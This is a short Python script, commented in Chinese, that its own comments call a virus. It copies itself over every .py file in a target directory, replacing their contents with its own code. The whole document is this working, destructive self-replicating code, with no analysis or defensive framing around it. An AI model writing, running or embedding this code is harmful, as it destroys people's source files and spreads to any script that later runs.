import os
import shutil

# 目標目錄
target_directory = "/path/to/target/directory"

# 取得當前文件的路徑
current_file = os.path.abspath(__file__)

# 複製病毒到目標目錄
for filename in os.listdir(target_directory):
    target_file = os.path.join(target_directory, filename)
    if filename.endswith('.py') and target_file != current_file:
        shutil.copy(current_file, target_file)
